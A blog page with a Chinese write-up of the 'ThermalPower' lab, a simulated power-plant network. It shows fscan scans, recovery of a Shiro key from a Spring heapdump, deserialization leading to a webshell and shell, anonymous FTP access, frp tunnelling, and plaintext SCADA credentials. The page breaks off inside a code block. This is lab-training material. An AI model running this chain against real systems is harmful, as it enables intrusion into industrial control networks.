

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>春秋云境-ThermalPower综合渗透 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="春秋云境-ThermalPower综合渗透" />
<meta property="og:description" content="春秋云境-ThermalPower综合渗透通关wp" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://scofield1920.github.io/chunqiuyunjing-thermalpower/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-01-26T00:00:00+08:00" />
<meta property="article:modified_time" content="2025-01-26T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="春秋云境-ThermalPower综合渗透"/>
<meta name="twitter:description" content="春秋云境-ThermalPower综合渗透通关wp"/>
<meta name="application-name" content="scofield-blog">
<meta name="apple-mobile-web-app-title" content="scofield-blog">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/chunqiuyunjing-thermalpower/" /><link rel="prev" href="http://scofield1920.github.io/2024cqbdjs/" /><link rel="next" href="http://scofield1920.github.io/chunqiuyunjing-delivery/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "春秋云境-ThermalPower综合渗透",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/scofield1920.github.io\/chunqiuyunjing-thermalpower\/"
        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "penetration, wp","wordcount":  845 ,
        "url": "http:\/\/scofield1920.github.io\/chunqiuyunjing-thermalpower\/","datePublished": "2025-01-26T00:00:00+08:00","dateModified": "2025-01-26T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
                    "width":  528 ,
                    "height":  560 
                }},"author": {
                "@type": "Person",
                "name": "Sc0fie1d"
            },"description": ""
    }
    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                        <option value="light">Light</option>
                        <option value="dark">Dark</option>
                        <option value="black">Black</option>
                        <option value="auto">Auto</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                    <option value="light">Light</option>
                    <option value="dark">Dark</option>
                    <option value="black">Black</option>
                    <option value="auto">Auto</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#外网打点">外网打点</a>
      <ul>
        <li><a href="#第一关">第一关</a></li>
      </ul>
    </li>
    <li><a href="#内网渗透">内网渗透</a>
      <ul>
        <li><a href="#第三关">第三关</a></li>
        <li><a href="#第二关">第二关</a></li>
        <li><a href="#第四关">第四关</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">春秋云境-ThermalPower综合渗透</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/penetration/"><i class="far fa-folder fa-fw"></i>Penetration</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a></span></div>
            <div class="post-meta-line">
    

    
        

        
        
            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
                
                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
        
    

<i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-01-26">2025-01-26</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-01-26">2025-01-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;845 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#外网打点">外网打点</a>
      <ul>
        <li><a href="#第一关">第一关</a></li>
      </ul>
    </li>
    <li><a href="#内网渗透">内网渗透</a>
      <ul>
        <li><a href="#第三关">第三关</a></li>
        <li><a href="#第二关">第二关</a></li>
        <li><a href="#第四关">第四关</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>春秋云境-ThermalPower综合渗透通关wp</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126155831845.png?imageSlim" title="image-20250126155831845" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126155831845.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126155831845.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126155831845.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126155831845.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126155831845.png?imageSlim 2x"
            sizes="auto"
            alt="image-20250126155831845">
    </a></figure></p>
<p>靶标介绍：该场景模拟仿真了电力生产企业的部分业务场景。“火创能源” 公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。 玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。 附件地址：https://pan.baidu.com/s/13jTP6jWi6tLWkbyO8SQSnQ?pwd=kj6h</p>
<h2 id="外网打点" class="headerLink">
    <a href="#%e5%a4%96%e7%bd%91%e6%89%93%e7%82%b9" class="header-mark"></a>外网打点</h2><h3 id="第一关" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%80%e5%85%b3" class="header-mark"></a>第一关</h3><p>关卡剧情：评估暴露在公网的服务的安全性，尝试建立通向生产区的立足点。</p>
<p>起手fscan</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">E:<span class="se">\T</span>ools<span class="se">\w</span>eb<span class="se">\f</span>scan_1.8.4&gt;fscan.exe -h 39.98.113.46
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   ___                              _
</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __
</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /
</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;
</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>                     fscan version: 1.8.4
</span></span><span class="line"><span class="cl">start infoscan
</span></span><span class="line"><span class="cl">39.98.113.46:8080 open
</span></span><span class="line"><span class="cl">39.98.113.46:22 open
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">2</span>
</span></span><span class="line"><span class="cl">start vulscan
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://39.98.113.46:8080  code:302 len:0      title:None 跳转url: http://39.98.113.46:8080/login<span class="p">;</span><span class="nv">jsessionid</span><span class="o">=</span>9D9BBC5BC01314BE4A8641EAA809995B
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://39.98.113.46:8080/login<span class="p">;</span><span class="nv">jsessionid</span><span class="o">=</span>9D9BBC5BC01314BE4A8641EAA809995B code:200 len:2936   title:火创能源监控画面管理平台
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://39.98.113.46:8080 poc-yaml-spring-actuator-heapdump-file
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://39.98.113.46:8080 poc-yaml-springboot-env-unauth spring2
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现内存泄露</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
</span></span></code></pre></td></tr></table>
</div>
</div><p>拿到key</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">CookieRememberMeManager<span class="o">(</span>ShiroKey<span class="o">)</span>
</span></span><span class="line"><span class="cl">-------------
</span></span><span class="line"><span class="cl"><span class="nv">algMode</span> <span class="o">=</span> CBC, <span class="nv">key</span> <span class="o">=</span> QZYysgMYhG6/CzIJlVpR2g<span class="o">==</span>, <span class="nv">algName</span> <span class="o">=</span> AES
</span></span></code></pre></td></tr></table>
</div>
</div><p>打shiro反序列化，注入冰蝎马，弹shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@security:/# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现是root权限，直接读flag</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126132414-v6pt4cr.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126132414-v6pt4cr.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126132414-v6pt4cr.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126132414-v6pt4cr.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126132414-v6pt4cr.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126132414-v6pt4cr.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<h2 id="内网渗透" class="headerLink">
    <a href="#%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f" class="header-mark"></a>内网渗透</h2><h3 id="第三关" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%89%e5%85%b3" class="header-mark"></a>第三关</h3><p>关卡剧情：尝试接管 SCADA 工程师站，并启动锅炉。</p>
<p>内网信息收集</p>
<p>ifconfig</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
</span></span><span class="line"><span class="cl">        inet 172.22.17.213  netmask 255.255.0.0  broadcast 172.22.255.255
</span></span><span class="line"><span class="cl">        inet6 fe80::216:3eff:fe0d:1e04  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class="line"><span class="cl">        ether 00:16:3e:0d:1e:04  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">130589</span>  bytes <span class="m">159982146</span> <span class="o">(</span>159.9 MB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">55074</span>  bytes <span class="m">39322967</span> <span class="o">(</span>39.3 MB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="m">65536</span>
</span></span><span class="line"><span class="cl">        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span class="line"><span class="cl">        inet6 ::1  prefixlen <span class="m">128</span>  scopeid 0x10&lt;host&gt;
</span></span><span class="line"><span class="cl">        loop  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Local Loopback<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">1876</span>  bytes <span class="m">158193</span> <span class="o">(</span>158.1 KB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">1876</span>  bytes <span class="m">158193</span> <span class="o">(</span>158.1 KB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>内网fscan</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./fscan -h 172.22.17.213/24
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   ___                              _  
</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __ 
</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /
</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;  
</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  
</span></span><span class="line"><span class="cl">                     fscan version: 1.8.4
</span></span><span class="line"><span class="cl">start infoscan
</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.17.6     is alive
</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.17.213   is alive
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Icmp alive hosts len is: <span class="m">2</span>
</span></span><span class="line"><span class="cl">172.22.17.213:8080 open
</span></span><span class="line"><span class="cl">172.22.17.6:445 open
</span></span><span class="line"><span class="cl">172.22.17.6:139 open
</span></span><span class="line"><span class="cl">172.22.17.6:135 open
</span></span><span class="line"><span class="cl">172.22.17.6:80 open
</span></span><span class="line"><span class="cl">172.22.17.213:22 open
</span></span><span class="line"><span class="cl">172.22.17.6:21 open
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">7</span>
</span></span><span class="line"><span class="cl">start vulscan
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.17.6     WORKGROUP<span class="se">\W</span>IN-ENGINEER      
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.17.6
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>WIN-ENGINEER
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.17.6
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.17.213:8080 code:302 len:0      title:None 跳转url: http://172.22.17.213:8080/login<span class="p">;</span><span class="nv">jsessionid</span><span class="o">=</span>F27C36D7263AE95B6931636B7EE0CB1D
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.17.213:8080/login<span class="p">;</span><span class="nv">jsessionid</span><span class="o">=</span>F27C36D7263AE95B6931636B7EE0CB1D code:200 len:2936   title:火创能源监控画面管理平台
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ftp 172.22.17.6:21:anonymous 
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>Modbus
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>PLC
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>web.config
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>WinCC
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>内部软件
</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>火创能源内部资料
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.17.6        code:200 len:661    title:172.22.17.6 - /
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://172.22.17.213:8080 poc-yaml-spring-actuator-heapdump-file 
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://172.22.17.213:8080 poc-yaml-springboot-env-unauth spring2
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现有可anonymous登录的ftp</p>
<p>也可以直接访问80端口</p>
<p>frp穿透出来</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126142350-5m4femf.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126142350-5m4femf.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126142350-5m4femf.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126142350-5m4femf.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126142350-5m4femf.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126142350-5m4femf.png?imageSlim 2x"
            sizes="auto"
            alt="image">
    </a></figure>​</p>
<p>拿到相关机器账号密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://172.22.17.6/%E7%81%AB%E5%88%9B%E8%83%BD%E6%BA%90%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/SCADA.txt
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">WIN-SCADA: 172.22.26.xx
</span></span><span class="line"><span class="cl">Username: Administrator
</span></span><span class="line"><span class="cl">Password: IYnT3GyCiy3
</span></span></code></pre></td></tr></table>
</div>
</div><p>frp扫一下172.22.26.0/24得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
